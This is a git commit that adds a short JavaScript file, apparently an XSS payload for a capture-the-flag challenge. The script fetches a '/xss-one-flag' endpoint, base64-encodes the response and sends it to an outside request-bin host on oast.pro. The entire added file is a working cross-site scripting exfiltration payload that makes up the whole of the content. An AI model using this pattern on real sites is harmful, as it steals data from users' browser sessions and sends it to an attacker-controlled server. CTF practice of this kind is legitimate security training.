0c1553305b083f3818dc26b5fe03ad1c5be1e285
big boss <test@test.com>
2026-03-22 12:15:09 +0530

    xxs script addedz

---
+++ js-xxs/request-handler.js
@@ -0,0 +1,7 @@
+// .js
+fetch('/xss-one-flag')
+  .then(r => r.text())
+  .then(flag => {
+    // Send the flag to your request bin
+    fetch('https://e54e8b0f1e833868b4cdguxhx8hyyyyyn.oast.pro/?flag=' + btoa(flag));
+  });
